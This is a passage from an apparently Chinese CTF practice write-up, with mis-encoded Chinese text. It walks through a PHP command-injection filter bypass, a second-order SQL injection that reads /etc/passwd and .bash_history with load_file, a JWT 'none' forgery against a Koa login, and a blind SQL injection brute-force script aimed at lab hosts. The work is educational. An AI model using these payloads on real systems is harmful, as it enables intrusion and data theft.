<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p>
<p>è¿˜å¯ä»¥ç›´æ¥getå‚æ•°è¿›å»</p>
<p>ä½†æ˜¯catå‚æ•°æ²¡æ³•ç›´æ¥ç”¨ï¼Œè¿˜æœ‰è¿‡æ»¤ï¼Œä¸è¿‡å¯ä»¥ç”¨æ¢è¡Œç¬¦ç»•è¿‡è¿‡æ»¤</p>
<pre><code>&lt;?php

putenv(&#39;PATH=/home/rceservice/jail&#39;);
è®¾ç½®äº†ç¯å¢ƒå˜é‡çš„PATHï¼Œå¯¼è‡´ä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œåªèƒ½ç”¨ç»å¯¹è·¯å¾„ï¼š
if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
    $json = $_REQUEST[&#39;cmd&#39;];
if (!is_string($json)) &#123;
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
&#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) &#123;
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
&#125; else &#123;
    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
    $cmd = json_decode($json, true)[&#39;cmd&#39;];
    if ($cmd !== NULL) &#123;
        system($cmd);
    &#125; else &#123;
        echo &#39;Invalid input&#39;;
    &#125;
    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
&#125;
&#125;
?&gt;
</code></pre>
<p>catå‘½ä»¤ä¸èƒ½ç”¨ï¼ŒåŸå› å¯èƒ½æ˜¯å½“å‰çš„PATHä¸‹æ²¡æœ‰catï¼Œè¿™é‡Œéœ€è¦ä¹Ÿéœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼š</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>å‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p>
</blockquote>
<p>cat è¯»å‡ºæºç ï¼ˆæˆ‘ä¹Ÿå¾ˆæƒ³çŸ¥é“ç½‘ä¸Šçš„wpæ²¡æºç ä¹‹å‰æ€ä¹ˆæƒ³åˆ°è¿™ä¹ˆç»•è¿‡çš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003758590.png" alt="image-20211115003758590"></p>
<p>ç„¶åæ‰¾flagåœ¨çš„ç›®å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115003933107.png" alt="image-20211115003933107"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004010321.png" alt="image-20211115004010321"></p>
<p>æ‰¾åˆ°ä¹‹ååˆ©ç”¨catè¯»å‡ºæ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115004044237.png" alt="image-20211115004044237"></p>
<h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p>æœ‰gitæ³„éœ²ï¼Œç”¨githackè·‘ä¸€éï¼Œç„¶ååˆ©ç”¨git log --reflogæŸ¥çœ‹å†å²æäº¤ï¼Œå†åˆ©ç”¨git resetå›æ»šç‰ˆæœ¬ï¼Œå¾—åˆ°åŸå§‹çš„ä»£ç </p>
<pre class="language-none"><code class="language-none">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;
    header(&quot;Location: .&#x2F;login.php&quot;);
    die();
&#125;
if(isset($_GET[&#39;do&#39;]))&#123;
switch ($_GET[&#39;do&#39;])
&#123;
case &#39;write&#39;:
    $category &#x3D; addslashes($_POST[&#39;category&#39;]);
    $title &#x3D; addslashes($_POST[&#39;title&#39;]);
    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
    $sql &#x3D; &quot;insert into board
            set category &#x3D; &#39;$category&#39;,
                title &#x3D; &#39;$title&#39;,
                content &#x3D; &#39;$content&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    header(&quot;Location: .&#x2F;index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);
    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    $num &#x3D; mysql_num_rows($result);
    if($num&gt;0)&#123;
    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];
    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
    $sql &#x3D; &quot;insert into comment
            set category &#x3D; &#39;$category&#39;,
                content &#x3D; &#39;$content&#39;,
                bo_id &#x3D; &#39;$bo_id&#39;&quot;;
    $result &#x3D; mysql_query($sql);
    &#125;
    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);
    break;
default:
    header(&quot;Location: .&#x2F;index.php&quot;);
&#125;
&#125;
else&#123;
    header(&quot;Location: .&#x2F;index.php&quot;);
&#125;
?&gt;</code></pre>

<p>è¾“å…¥çš„å†…å®¹éƒ½è¢«addslashesè¿‡æ»¤äº†ï¼Œä½†æ˜¯å†commentéƒ¨åˆ†ï¼Œcategoryæ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­è°ƒå‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥</p>
<p>åœ¨å‘å¸–éƒ¨åˆ†ï¼šçš„categoryé‡Œè¾“å…¥x&#39;,content=database(),/*</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213616672.png" alt="image-20211117213616672"></p>
<p>å†åœ¨æäº¤ç•™è¨€é‡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213710038.png" alt="image-20211117213710038"></p>
<p>è¿™æ ·å¯ä»¥å½¢æˆå¤šè¡Œæ³¨é‡Šï¼Œæ³¨é‡Šæ‰åŸæœ‰çš„contentå­—æ®µ</p>
<p>å¯ä»¥å¾—åˆ°æ•°æ®åº“åç§°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213738173.png" alt="image-20211117213738173"></p>
<p>è¿™æ—¶æŸ¥è¯¢è¯­å¥ä¸º</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment
        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,
            content &#x3D; &#39;*&#x2F;#&#39;,
            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>å³</p>
<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment
        set category &#x3D; &#39;x&#39;,content&#x3D;database(),
            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p><strong>SQLè¯»å–æ–‡ä»¶</strong><br>ç”¨load_file()å‡½æ•°è¿›è¡Œè¯»å–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚ è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚</p>
<p><strong>.bash_history</strong></p>
<p>.bash_historyä¸ºåœ¨unix/linuxç³»ç»Ÿä¸‹ä¿å­˜å†å²å‘½ä»¤çš„æ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æ ¹ç›®å½•ä¸‹ï¼Œå³<code>~/</code>å¤„ã€‚</p>
<p><strong>.DS_Storeæ–‡ä»¶æ³„éœ²</strong></p>
<p>æ–‡ä»¶æ³„éœ²ï¼Œæœ‰ä¸€ä¸ªä¸‹è½½è‡³æœ¬åœ°çš„<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">è„šæœ¬</a>ï¼Œä¸è¿‡è¿™é¢˜ç”¨ä¸ä¸Šã€‚</p>
<p>åœ¨å‘å¸–ä¹‹å‰è¿˜æœ‰ä¸ªç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åå’Œå¯†ç å‰å‡ ä½ç›´æ¥ç»™äº†ï¼Œå‰©ä¸‹ä¸‰ä½çˆ†ç ´å¾—åˆ°666</p>
<p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214221610.png" alt="image-20211117214221610"></p>
<p>ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æŸ¥è¿™é‡Œçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯ç™¾åº¦å…¶ä»–å¸ˆå‚…çš„wpéƒ½æœ‰è¿™æ­¥</p>
<p>åº”è¯¥æ˜¯ä¸ºäº†çŸ¥é“.bash_histroyæ–‡ä»¶çš„è·¯å¾„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214325543.png" alt="image-20211117214325543"></p>
<p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214355622.png" alt="image-20211117214355622"></p>
<p>æ¥ç€å†æŸ¥.DS_Store</p>
<p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p>
<p>ä¸ºäº†ä½¿å…¶å…¨éƒ¨æ˜¾ç¤ºï¼Œè¦ç”¨hexç¼–ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214600582.png" alt="image-20211117214600582"></p>
<p>ç„¶åè§£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214639450.png" alt="image-20211117214639450"></p>
<p>çœ‹è§æœ‰ä¸ªflagæ–‡ä»¶</p>
<p>è¯»ä¸€ä¸‹</p>
<p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214713821.png" alt="image-20211117214713821"></p>
<p>å†è§£ç ï¼Œæ‹¿åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214747130.png" alt="image-20211117214747130"></p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>æ³¨å†Œä¸ªè´¦å·ï¼Œç™»å½•ï¼Œçœ‹åˆ°æœ‰ä¸ªgetflagä½†æ˜¯æç¤ºæƒé™ä¸å¤Ÿ</p>
<p>æŸ¥çœ‹æºç å‘ç°å…¨æ˜¯jsçš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122204752692.png" alt="image-20211122204752692"></p>
<p>çœ‹ä¸€ä¸‹app.js</p>
<pre class="language-none"><code class="language-none">&#x2F;**
 *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶
 *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD
 *&#x2F;

function login() &#123;
    const username &#x3D; $(&quot;#username&quot;).val();
    const password &#x3D; $(&quot;#password&quot;).val();
    const token &#x3D; sessionStorage.getItem(&quot;token&quot;);
    $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;)
        .done(function(data) &#123;
            const &#123;status&#125; &#x3D; data;
            if(status) &#123;
                document.location &#x3D; &quot;&#x2F;home&quot;;
            &#125;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function register() &#123;
    const username &#x3D; $(&quot;#username&quot;).val();
    const password &#x3D; $(&quot;#password&quot;).val();
    $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;)
        .done(function(data) &#123;
            const &#123; token &#125; &#x3D; data;
            sessionStorage.setItem(&#39;token&#39;, token);
            document.location &#x3D; &quot;&#x2F;login&quot;;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function logout() &#123;
    $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123;
        const &#123;status&#125; &#x3D; data;
        if(status) &#123;
            document.location &#x3D; &#39;&#x2F;login&#39;;
        &#125;
    &#125;);
&#125;

function getflag() &#123;
    $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123;
        const &#123;flag&#125; &#x3D; data;
        $(&quot;#username&quot;).val(flag);
    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;
        alert(xhr.responseJSON.message);
    &#125;);
&#125;</code></pre>

<p>æç¤ºæ˜¯åŸºäºNode.jsçš„koaæ¡†æ¶ï¼Œä½†æ˜¯è¿™ä¸ªé¡µé¢çš„ä»£ç å¹¶ä¸æ˜¯é€»è¾‘ä»£ç ï¼Œç”¨å¤„ä¸å¤§ã€‚<br>åœ¨æ³¨é‡Šé‡Œæç¤ºé™æ€æ–‡ä»¶å¤„ç†å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
<p>è¿™é‡Œéœ€è¦å¯¹koaæ¡†æ¶çš„ç›®å½•æœ‰ä¸€å®šçš„äº†è§£</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122205026873.png" alt="image-20211122205026873"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p>
<p>è®¿é—®ä¸€ä¸‹controllersè·¯å¾„ä¸‹çš„api.js</p>
<p>é¢ï¼Œè¿™é‡Œèµµæ€»è¯´æ˜¯ç»éªŒã€‚ã€‚ã€‚</p>
<pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);
const fs &#x3D; require(&#39;fs&#39;)
const jwt &#x3D; require(&#39;jsonwebtoken&#39;)

const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError;

module.exports &#x3D; &#123;
    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;
        const &#123;username, password&#125; &#x3D; ctx.request.body;

        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        &#125;

        if(global.secrets.length &gt; 100000) &#123;
            global.secrets &#x3D; [];
        &#125;

        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid &#x3D; global.secrets.length;
        global.secrets.push(secret)

        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        ctx.rest(&#123;
            token: token
        &#125;);

        await next();
    &#125;,

    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;
        const &#123;username, password&#125; &#x3D; ctx.request.body;

        if(!username || !password) &#123;
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        &#125;

        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        &#125;

        const secret &#x3D; global.secrets[sid];

        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;

        if(status) &#123;
            ctx.session.username &#x3D; username;
        &#125;

        ctx.rest(&#123;
            status
        &#125;);

        await next();
    &#125;,

    &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123;
        if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123;
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        &#125;

        const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString();
        ctx.rest(&#123;
            flag
        &#125;);

        await next();
    &#125;,

    &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123;
        ctx.session.username &#x3D; null;
        ctx.rest(&#123;
            status: true
        &#125;)
        await next();
    &#125;
&#125;;</code></pre>

<p>èµµæ€»wpé‡Œçš„å®¡è®¡:</p>
<p>æ³¨å†Œ /api/registerï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œå…ˆåˆ¤æ–­ username ä¸ä¸º adminï¼Œç„¶åç”Ÿæˆä¸€ä¸ª key æ¥ä»¥è¿™äº›ä¿¡æ¯ä¸ºä¾æ®ï¼Œç”Ÿæˆä¸€ä¸ª jwt ä»¤ç‰Œï¼Œkey åŒæ—¶å­˜å…¥å…¨å±€æ•°ç»„ã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873008936cf41d35abc0ecab06b6f56706bee1b5-1024x542.png" alt="img"></p>
<p>ç™»å½• /api/loginï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œç„¶åä»ä»¤ç‰Œçš„ä¿¡æ¯æ®µä¸­å– key çš„ idï¼Œä»ç¨‹åºä¸­çš„å…¨å±€æ•°ç»„å–å‡º keyï¼Œç„¶åè¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡ä¹‹åç½® session ä¸­çš„ username ä¸ºç™»å½•æ—¶ä½¿ç”¨çš„ usernameã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301099a4070df83cd56999e7efbafb05e2e004-1024x757.png" alt="img"></p>
<p>è·å–FLAG /api/flagï¼Œåˆ¤æ–­ session ä¸­çš„ç”¨æˆ·åæ˜¯å¦ä¸º adminï¼Œæ˜¯çš„è¯å°±ç›´æ¥ç»™ flagã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301284fe28eb6eb5a5362ed0749a45de8eb406-1024x468.png" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°ä¿¡æ¯æ˜¯ç”¨ jwt ä»¤ç‰Œå‚¨å­˜çš„ï¼Œä½¿ç”¨ jsonwebtoken åº“æ¥æ“ä½œï¼Œè¿™é‡Œç”¨çš„æ˜¯ HS256åŠ å¯†ï¼Œä½†ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡ï¼Œè¿™æ ·å¾ˆè½»æ¾åœ°å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª username ä¸º admin çš„ jwttoken äº†ã€‚</p>
<p>åœ¨ç™»å½•ç•Œé¢æŠ“åŒ…åè¾¹è¿™ä¸²å°±æ˜¯jwtï¼ˆå½“æ—¶å¿˜äº†æˆªå›¾ï¼Œè¿™æ˜¯æ”¹å®Œjwtä¹‹åçš„äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210021834.png" alt="image-20211122210021834"></p>
<p>ä¹‹ååœ¨<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens - jwt.io</a>é‡Œè§£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210147429.png" alt="image-20211122210147429"></p>
<p>æ¥ä¸‹æ¥ä¹Ÿæ˜¯èµµæ€»çš„åˆ†æï¼š</p>
<p>å›åˆ°æºç¨‹åºé€»è¾‘ä¸­ï¼Œè‹¥æƒ³è®©è¿™é‡Œçš„å¯†é’¥ keyä¸ºç©ºï¼Œå°±éœ€è¦ä¿®æ”¹ä¸Šé¢çš„ secretidã€‚é‚£ä¹ˆå°±å°è¯•ä¿®æ”¹ secretidï¼Œä½¿å…¶æ— æ³•ä½œä¸ºå…¨å±€å˜é‡ secrets æ•°ç»„çš„ç´¢å¼•ï¼Œé‚£ä¹ˆ secret å°±ä¼šä¸ºç©ºäº†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/wp-content/uploads/2020/04/15873021389c8e46ed2ff4ebdc4215e90585dbcd31.png"><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873021389c8e46ed2ff4ebdc4215e90585dbcd31-1024x245.png" alt="img"></a></p>
<p>æ³¨æ„ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéªŒè¯ï¼Œè¦æ±‚ sid ä¸èƒ½ä¸º undefinedï¼Œnullï¼Œå¹¶ä¸”å¿…é¡»åœ¨å…¨å±€å˜é‡ secrets æ•°ç»„çš„é•¿åº¦å’Œ 0 ä¹‹é—´ã€‚ä¹çœ‹ä¹‹ä¸‹æ²¡æœ‰æ“ä½œç©ºé—´ï¼Œæ€ä¹ˆæ•´éƒ½ä¼šå–å‡º å¯†é’¥ keyã€‚ä½†åˆ«å¿˜äº† JavaScript æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼ŒNodeJS éƒ½æ˜¯ JS çš„è¯­æ³•ï¼Œé‚£è‡ªç„¶ä¹Ÿæ˜¯å’¯ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦é€‰æ‹©æ°å½“çš„æ•°æ®æ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­å³å¯ã€‚å¯ä»¥åšä¸€ä¸ªå°å®éªŒæ¥éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/158730244598990809373d961e187fa7d0a66cc4ce-1024x459.png" alt="img">ä¸€ä¸ªå°å®éªŒï¼Œç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ°¸è¿œä¸ºçœŸï¼Œå½“ç„¶ç”¨ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„ä¹Ÿå¯ä»¥</p>
<p>æœ€ååˆ©ç”¨pythonçš„PyJWTåº“æ¥åŠ å¯†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210434868.png" alt="image-20211122210434868"></p>
<p>æŠ“åŒ…å†æ”¾åŒ…å°±å¯ä»¥è¯»å–è¿™ä¸ªflag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210523101.png" alt="image-20211122210523101"></p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6512.html">è™ç¬¦ CTF Web éƒ¨åˆ† Writeup â€“ glzjin (zhaoj.in)</a></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>orè¢«è¿‡æ»¤äº†ï¼Œæ²¡æ³•ç”¨informationæŸ¥è¡¨äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨</p>
<pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre>

<p>æ­£ç¡®çš„æ—¶å€™è¿”å›Nu1Lï¼Œé”™è¯¯æ—¶è¿”å›V&amp;N</p>
<p>çˆ†è¡¨è„šæœ¬</p>
<pre class="language-none"><code class="language-none">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;

payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;

database&#x3D; &#39;&#39;

for i in range(1,1000):
	low &#x3D; 32
	heigh &#x3D; 128
	mid &#x3D; (low + heigh) &#x2F;&#x2F; 2
	while (low &lt; heigh):
		payload1 &#x3D; payload.format(i,mid)
		post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;
		r &#x3D; requests.post(url,data&#x3D;post_data)
		print(payload1)
		if &quot;Nu1L&quot; in r.text:
			low &#x3D; mid + 1
		else:
			heigh &#x3D; mid
		mid &#x3D; (low + heigh) &#x2F;&#x2F; 2
	if mid &#x3D;&#x3D; 32:
		break
	database +&#x3D;chr(mid)
	print(database)</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202113511.png" alt="image-20211123202113511"></p>
<p>å¾—åˆ°è¡¨ååï¼Œæ‹¿ä¸åˆ°åˆ—åï¼Œè¿™é‡Œå¯ä»¥ç”¨æ— åˆ—åæ³¨å…¥</p>
<p>å…ˆè´´payload</p>
<p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p>
<p>é‡‡ç”¨äº†å­—ç¬¦åç§»</p>
<ul>
<li><p>æŒ‰ä½å»æ¯”è¾ƒï¼Œå¦‚æœçˆ†ç ´å­—ç¬¦ä¸flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç›¸ç­‰ï¼Œå°±å‘åç»§ç»­ï¼Œå¤§äº†å°äº†éƒ½è¦ç»§ç»­å½“å‰çš„å¾ªç¯ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å­—ç¬¦</p>
</li>
<li><p>æ‰€ä»¥æœ€åçš„midè¦å‡ä¸€æ‰æ˜¯æ­£ç¡®çš„å­—ç¬¦</p>
</li>
<li><p>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥åå…­è¿›åˆ¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦</p>
</li>
<li><p>mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ¯”è¾ƒçš„æ—¶å€™O(0x4f)çš„asciiæ¯”f(0x66)çš„asciiå°ï¼Œä½†æ˜¯æ¯”è¾ƒçš„ç»“æœæ˜¯Oæ¯”få¤§ </p>
</li>
</ul>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202924585.png" alt="image-20211123202924585"></p>
<p>è¿™é‡Œè¦å’Œflagçš„è¡¨çš„åˆ—æ•°ä¸€æ ·</p>
<p>æœ€åè·‘ä¸€ä¸‹æ‹¿flag</p>
<pre class="language-none"><code class="language-none">import requests

